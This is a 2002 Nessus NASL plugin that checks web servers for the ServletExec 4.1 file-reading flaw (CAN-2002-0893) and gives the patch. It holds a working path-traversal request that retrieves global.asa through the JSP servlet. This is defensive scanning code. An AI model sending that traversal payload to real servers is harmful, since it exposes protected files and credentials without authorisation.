#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10959);
 script_version ("$Revision: 1.5 $");
 script_cve_id("CAN-2002-0893");
 script_bugtraq_id(4795);
 name["english"] = "ServletExec 4.1 ISAPI File Reading";
 name["francais"] = "ServletExec 4.1 ISAPI File Reading";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
By invoking the JSPServlet directly it is possible to read the contents of 
files within the webroot that would not normally be accessible (global.asa, 
for example.) When attempting to retrieve ASP pages it is common to see many 
errors due to their similarity to JSP pages in syntax, and hence only 
fragments of these pages are returned. Text files can generally be read 
without problem.

Solution: 

Download Patch #9 from ftp://ftp.newatlanta.com/public/4_1/patches/

References: www.westpoint.ltd.uk/advisories/wp-02-0006.txt

Risk factor : Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for ServletExec File Reading";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2002 Matt Moore",
		francais:"Ce script est Copyright (C) 2002 Matt Moore");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(get_port_state(port))
{ 
# Uses global.asa as target to retrieve. Could be improved to use output of webmirror.nasl

 req = http_get(item:"/servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5cglobal.asa", port:port);
	  
 soc = http_open_socket(port);
 if(soc)
 {
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 confirmed = string("OBJECT RUNAT=Server"); 
 if(confirmed >< r)	
 	security_hole(port);
 }
}

